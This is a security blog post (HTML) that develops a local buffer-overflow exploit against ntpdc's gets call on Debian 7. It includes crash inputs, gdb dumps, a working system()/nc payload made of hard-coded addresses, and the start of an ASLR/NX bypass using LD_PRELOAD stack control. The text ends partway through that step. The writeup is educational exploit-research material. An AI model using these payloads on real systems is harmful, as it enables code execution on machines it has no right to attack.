
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>ntpdc local buffer overflow - </title>
  <meta name="author" content="Bryan Alexander">

  
  <meta name="description" content="Alejandro Hdez (@nitr0usmx) recently tweeted about a trivial buffer overflow in ntpdc, a deprecated NTP query tool still available and packaged with &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://hatRiot.github.io/blog/2015/01/06/ntpdc-exploit">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
  

</head>

<body   class="collapse-sidebar sidebar-footer" >
  <!--<header role="banner"><hgroup>
  <h1><a href="/"></a></h1>
  
</hgroup>

</header>-->
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:hatRiot.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Home</a></li>
  <li><a href="/other">Other</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Ntpdc Local Buffer Overflow</h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-01-06T13:10:04-08:00" pubdate data-updated="true">Jan 6<span>th</span>, 2015</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Alejandro Hdez (@nitr0usmx) recently <a href="https://twitter.com/nitr0usmx/status/550372148448333825">tweeted</a> about a trivial buffer overflow in ntpdc, a deprecated NTP query tool still available and packaged with any NTP install.  He posted a screenshot of the crash as the result of a large buffer passed into a vulnerable <code>gets</code> call.  After digging into it a bit, I decided it&rsquo;d be a fun exploit to write, and it was.  There are a few quarks to it that make it of particular interest, of which I&rsquo;ve detailed below.</p>

<p>As noted, the bug is the result of a vulnerable <code>gets</code>, which can be crashed with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*600' | ntpdc
</span><span class='line'>***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' unknown
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>Loading into gdb on an x86 Debian 7 system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ i r eax edx esi
</span><span class='line'>eax            0x41414141   0x41414141
</span><span class='line'>edx            0x41414141   0x41414141
</span><span class='line'>esi            0x41414141   0x41414141
</span><span class='line'>gdb-peda$ x/i $eip
</span><span class='line'>=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14]
</span><span class='line'>gdb-peda$ checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : ENABLED
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial</span></code></pre></td></tr></table></div></figure>


<p>Notice the <code>checksec</code> results of the binary, now compare this to a snippet of the <code>paxtest</code> output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mode: Blackhat
</span><span class='line'>Linux deb7-32 3.2.0-4-486 #1 Debian 3.2.63-2+deb7u2 i686 GNU/Linux
</span><span class='line'>
</span><span class='line'>Executable anonymous mapping             : Vulnerable
</span><span class='line'>Executable bss                           : Vulnerable
</span><span class='line'>Executable data                          : Vulnerable
</span><span class='line'>Executable heap                          : Vulnerable
</span><span class='line'>Executable stack                         : Vulnerable
</span><span class='line'>Executable shared library bss            : Vulnerable
</span><span class='line'>Executable shared library data           : Vulnerable</span></code></pre></td></tr></table></div></figure>


<p>And the result of Debian&rsquo;s recommended <code>hardening-check</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ hardening-check /usr/bin/ntpdc 
</span><span class='line'>/usr/bin/ntpdc:
</span><span class='line'> Position Independent Executable: no, normal executable!
</span><span class='line'> Stack protected: yes
</span><span class='line'> Fortify Source functions: yes (some protected functions found)
</span><span class='line'> Read-only relocations: yes
</span><span class='line'> Immediate binding: no, not found!</span></code></pre></td></tr></table></div></figure>


<p>Interestingly enough, I discovered this oddity after I had gained code execution in a place I shouldn&rsquo;t have.  We&rsquo;re also running with ASLR enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /proc/sys/kernel/randomize_va_space 
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ll explain why the above is interesting in a moment.</p>

<p>So in our current state, we control three registers and an instruction dereferencing <code>ESI+0x14</code>.  If we take a look just a few instructions ahead, we see the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/8i $eip
</span><span class='line'>=&gt; 0xb7fa1d76 &lt;el_gets+22&gt;: mov    eax,DWORD PTR [esi+0x14] ; deref ESI+0x14 and move into EAX
</span><span class='line'>   0xb7fa1d79 &lt;el_gets+25&gt;: test   al,0x2                   ; test lower byte against 0x2
</span><span class='line'>   0xb7fa1d7b &lt;el_gets+27&gt;: je     0xb7fa1df8 &lt;el_gets+152&gt; ; jump if ZF == 1
</span><span class='line'>   0xb7fa1d7d &lt;el_gets+29&gt;: mov    ebp,DWORD PTR [esi+0x2c] ; doesnt matter 
</span><span class='line'>   0xb7fa1d80 &lt;el_gets+32&gt;: mov    DWORD PTR [esp+0x4],ebp  ; doesnt matter
</span><span class='line'>   0xb7fa1d84 &lt;el_gets+36&gt;: mov    DWORD PTR [esp],esi      ; doesnt matter
</span><span class='line'>   0xb7fa1d87 &lt;el_gets+39&gt;: call   DWORD PTR [esi+0x318]    ; call a controllable pointer </span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;ve detailed the instructions above, but essentially we&rsquo;ve got a free CALL.  In order to reach this, we need an ESI value that at +0x14 will set ZF == 0 (to bypass the test/je) and at +0x318 will point into controlled data.</p>

<p>Naturally, we should figure out where our payload junk is and go from there.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ searchmem 0x41414141
</span><span class='line'>Searching for '0x41414141' in: None ranges
</span><span class='line'>Found 751 results, display max 256 items:
</span><span class='line'> ntpdc : 0x806ab00 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>gdb-peda$ maintenance i sections
</span><span class='line'>[snip]
</span><span class='line'>0x806a400-&gt;0x806edc8 at 0x00021400: .bss ALLOC
</span><span class='line'>gdb-peda$ vmmap
</span><span class='line'>Start      End        Perm  Name
</span><span class='line'>0x08048000 0x08068000 r-xp  /usr/bin/ntpdc
</span><span class='line'>0x08068000 0x08069000 r--p  /usr/bin/ntpdc
</span><span class='line'>0x08069000 0x0806b000 rw-p  /usr/bin/ntpdc
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Our payload is copied into BSS, which is beneficial as this will remain unaffected by ASLR, further bonus points because our binary wasn&rsquo;t compiled with PIE.  We now need to move back -0x318 and look for a value that will set ZF == 0 with the <code>test al,0x2</code> instruction.  A value at <code>0x806a9e1</code> satisfies both the +0x14 and +0x318 requirements:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/wx 0x806a9cd+0x14
</span><span class='line'>0x806a9e1:  0x6c61636f
</span><span class='line'>gdb-peda$ x/wx 0x806a9cd+0x318
</span><span class='line'>0x806ace5:  0x41414141</span></code></pre></td></tr></table></div></figure>


<p>After figuring out the offset in the payload for ESI, we just need to plug <code>0x806a9cd</code> in and hopefully we&rsquo;ll have EIP:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "C"*4 + "A"*79 + "\xcd\xa9\x06\x08" + "C"*600' &gt; crash.info
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>$ r &lt; crash.info
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0xb7fabff4 --&gt; 0x1fe40 
</span><span class='line'>ECX: 0xb7dc13c0 --&gt; 0x0 
</span><span class='line'>EDX: 0x43434343 ('CCCC')
</span><span class='line'>ESI: 0x806a9cd --&gt; 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x0 
</span><span class='line'>ESP: 0xbffff3cc --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
</span><span class='line'>EIP: 0x43434343 ('CCCC')
</span><span class='line'>EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x43434343
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3cc --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
</span><span class='line'>0004| 0xbffff3d0 --&gt; 0x806a9cd --&gt; 0x0 
</span><span class='line'>0008| 0xbffff3d4 --&gt; 0x0 
</span><span class='line'>0012| 0xbffff3d8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
</span><span class='line'>0016| 0xbffff3dc --&gt; 0x0 
</span><span class='line'>0020| 0xbffff3e0 --&gt; 0xb7c677f4 --&gt; 0x1cce 
</span><span class='line'>0024| 0xbffff3e4 --&gt; 0x807b6f8 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbffff3e8 --&gt; 0x807d3b0 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x43434343 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve got EIP, it&rsquo;s a simple matter of stack pivoting to execute a ROP payload.  Let&rsquo;s figure out where that <code>"C"*600</code> lands in memory and redirect EIP there:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ searchmem 0x43434343
</span><span class='line'>Searching for '0x43434343' in: None ranges
</span><span class='line'>Found 755 results, display max 256 items:
</span><span class='line'> ntpdc : 0x806ace5 ("CCCC", 'A' &lt;repeats 79 times&gt;, "ͩ\006\b", 'C' &lt;repeats 113 times&gt;...)
</span><span class='line'> ntpdc : 0x806ad3c ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'> [snip]</span></code></pre></td></tr></table></div></figure>


<p>And we&rsquo;ll fill it with <code>\xcc</code> to ensure we&rsquo;re there (theoretically triggering NX):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\xcc"*600' &gt; crash.info
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ r &lt; crash.info 
</span><span class='line'>[snip]
</span><span class='line'>Program received signal SIGTRAP, Trace/breakpoint trap.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0xb7fabff4 --&gt; 0x1fe40 
</span><span class='line'>ECX: 0xb7dc13c0 --&gt; 0x0 
</span><span class='line'>EDX: 0xcccccccc 
</span><span class='line'>ESI: 0x806a9cd --&gt; 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x0 
</span><span class='line'>ESP: 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
</span><span class='line'>EIP: 0x806ad3d --&gt; 0xcccccccc
</span><span class='line'>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x806ad38:   int    0xa9
</span><span class='line'>   0x806ad3a:   push   es
</span><span class='line'>   0x806ad3b:   or     ah,cl
</span><span class='line'>=&gt; 0x806ad3d:   int3   
</span><span class='line'>   0x806ad3e:   int3   
</span><span class='line'>   0x806ad3f:   int3   
</span><span class='line'>   0x806ad40:   int3   
</span><span class='line'>   0x806ad41:   int3
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
</span><span class='line'>0004| 0xbffff3f0 --&gt; 0x806a9cd --&gt; 0x0 
</span><span class='line'>0008| 0xbffff3f4 --&gt; 0x0 
</span><span class='line'>0012| 0xbffff3f8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
</span><span class='line'>0016| 0xbffff3fc --&gt; 0x0 
</span><span class='line'>0020| 0xbffff400 --&gt; 0xb7c677f4 --&gt; 0x1cce 
</span><span class='line'>0024| 0xbffff404 --&gt; 0x807b9d0 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbffff408 --&gt; 0x807d688 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGTRAP
</span><span class='line'>0x0806ad3d in ?? ()
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>Er, what?  It appears to be executing code in BSS! Recall the output of paxtest/checksec/hardening-check from earlier, NX was clearly enabled.  This took me a few hours to figure out, but it ultimately came down to Debian not distributing x86 images with PAE, or Physical Address Extension.  PAE is a kernel feature that allows 32-bit CPU&rsquo;s to access physical page tables and doubling each entry in the page table and page directory.  This third level of paging and increased entry size is required for NX on x86 architectures because NX adds a single &lsquo;dont execute&rsquo; bit to the page table.  You can read more about PAE <a href="http://en.wikipedia.org/wiki/Physical_Address_Extension">here</a>, and the original NX patch <a href="http://lwn.net/Articles/87808/">here</a>.</p>

<p>This flag can be tested for with a simple grep of <code>/proc/cpuinfo</code>; on a fresh install of Debian 7, a grep for PAE will turn up empty, but on something with support, such as Ubuntu, you&rsquo;ll get the flag back.</p>

<p>Because I had come this far already, I figured I might as well get the exploit working.  At this point it was simple, anyway:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\x90"*4 + "\x68\xec\xf7\xff\xbf\x68\x70\xe2\xc8\xb7\x68\x30\xac\xc9\xb7\xc3"' &gt; input2.file 
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ r &lt; input.file 
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
</span><span class='line'>***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAͩ����h����hp�ȷh0�ɷ�' unknown
</span><span class='line'>[New process 4396]
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
</span><span class='line'>process 4396 is executing new program: /bin/dash
</span><span class='line'>[New process 4397]
</span><span class='line'>process 4397 is executing new program: /bin/nc.traditional</span></code></pre></td></tr></table></div></figure>


<p>This uses a simple <code>system</code> payload with hard-coded addresses, because at this point it&rsquo;s an old-school, CTF-style exploit.  And it works.  With this trivial PoC working, I decided to check another box I had to verify this is a common distribution method.  An Ubuntu VM said otherwise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ uname -a
</span><span class='line'>Linux bryan-VirtualBox 3.2.0-74-generic #109-Ubuntu SMP Tue Dec 9 16:47:54 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'>$ ./checksec.sh --file /usr/bin/ntpdc
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /usr/bin/ntpdc
</span><span class='line'>$ cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>Quite a different story.  We need to bypass full RELRO (no GOT overwrites), PIE+ASLR, NX, SSP, and ASCII armor.  In our current state, things are looking pretty grim.  As an aside, it&rsquo;s important to remember that because this is a local exploit, the attacker is assumed to have limited control over the system.  Ergo, an attacker may inspect and modify the system in the same manner a limited user could.  This becomes important with a few techniques we&rsquo;re going to use moving forward.</p>

<p>Our first priority is stack pivoting; we won&rsquo;t be able to ROP to victory without control over the stack.  There are a few options for this, but the easiest option is likely going to be an <code>ADD ESP, ?</code> gadget.  The problem with this being that we need to have some sort of control over the stack or be able to modify ESP somewhere into BSS that we control.  Looking at the output of <code>ropgadget</code>, we&rsquo;ve got 36 options, almost all of which are of the form <code>ADD ESP, ?</code>.</p>

<p>After looking through the list, I determined that none of the values led to control over the stack; in fact, nothing I injected landed on the stack.  I did note, however, the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/6i 0x800143e0
</span><span class='line'>   0x800143e0: add    esp,0x256c
</span><span class='line'>   0x800143e6: pop    ebx
</span><span class='line'>   0x800143e7: pop    esi
</span><span class='line'>   0x800143e8: pop    edi
</span><span class='line'>   0x800143e9: pop    ebp
</span><span class='line'>   0x800143ea: ret 
</span><span class='line'>gdb-peda$ x/30s $esp+0x256c
</span><span class='line'>0xbffff3a4:  "-1420310755.557158-104120677"
</span><span class='line'>0xbffff3c1:  "WINDOWID=69206020"
</span><span class='line'>0xbffff3d3:  "GNOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM"
</span><span class='line'>0xbffff3fd:  "GTK_MODULES=canberra-gtk-module:canberra-gtk-module"</span></code></pre></td></tr></table></div></figure>


<p>These are environmental variables passed into the application and located on the program stack.  Using the ROP gadget <code>ADD ESP, 0x256c</code>, followed by a series of register POPs, we could land here.  Controlling this is easy with the help of LD_PRELOAD, a neat trick <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">documented</a> by Dan Rosenberg in 2010.  By exporting LD_PRELOAD, we can control uninitialized data located on the stack, as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*10000'`
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>[..snip..]
</span><span class='line'>gdb-peda$ x/10wx $esp+0x256c
</span><span class='line'>0xbfffedc8: 0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xbfffedd8: 0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xbfffede8: 0x41414141  0x41414141
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>Using some pattern_create/offset magic, we can find the offset in our LD_PRELOAD string and take control over EIP and the stack:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*8490 + "AAAA" + "BBBB"'`
